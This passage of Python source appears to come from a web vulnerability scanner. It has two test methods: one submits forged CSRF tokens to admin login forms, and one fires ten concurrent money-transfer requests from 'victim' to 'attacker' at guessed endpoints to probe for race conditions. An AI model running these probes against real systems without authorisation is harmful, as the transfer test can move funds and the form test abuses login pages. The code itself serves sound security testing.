    def test_csrf_token_validation(self):
        """Test if CSRF tokens are validated — submit with invalid token."""
        if not self.deep: return
        self._print("[*]", "CSRF token validation test...", "INFO")
        # Fetch a login form first to get a valid token
        for panel in self.results["admin_panels"][:3]:
            url = panel["url"]
            r = self._get(url)
            if not r: continue
            # Look for _token or csrf token
            m = re.search(r'name=["\'](?:_token|csrf[^"\']*|csrfmiddlewaretoken)["\']\s+value=["\']([^"\']+)["\']',
                          r.text or "", re.I)
            if not m: continue
            valid_token = m.group(1)
            # Try submit with invalid token
            invalid_data = {
                "_token": "invalid_token",
                "csrf_token": "invalid_token",
                "csrfmiddlewaretoken": "invalid_token",
                "username": "test", "password": "test",
                "user": "test", "pass": "test",
                "login": "Login", "submit": "Login",
            }
            r2 = self._post(url, data=invalid_data)
            if r2 and r2.status_code in (200, 302):
                # If invalid token was accepted → CSRF vuln
                if "invalid" not in (r2.text or "").lower() and "error" not in (r2.text or "").lower():
                    self._add_vuln("CSRF Token Validation Missing", "HIGH",
                                    url, "invalid CSRF token accepted",
                                    panel=url)

    def test_race_balance_transfer(self):
        """Race condition — simultaneous balance transfer."""
        if not self.deep: return
        self._print("[*]", "Race condition (balance transfer)...", "INFO")
        # Find balance/transfer endpoints
        endpoints = ["/transfer", "/api/transfer", "/api/wallet/transfer",
                     "/send-money", "/api/payment"]
        for ep in endpoints:
            url = urljoin(self.target, ep)
            # Try 10 simultaneous transfers of amount 1
            data = {"amount": "1", "to_account": "attacker", "from_account": "victim"}
            threads = []
            results = [None] * 10
            def send(i, results):
                results[i] = self._post(url, data=data)
            for i in range(10):
                t = threading.Thread(target=send, args=(i, results))
                threads.append(t)
            for t in threads: t.start()
            for t in threads: t.join()
            success = sum(1 for r in results if r and r.status_code == 200)
            if success > 1:
                self._add_vuln("Race condition (balance transfer)", "HIGH",
                                url, f"{success}/10 simultaneous transfers succeeded",
                                endpoint=ep, success_count=success)

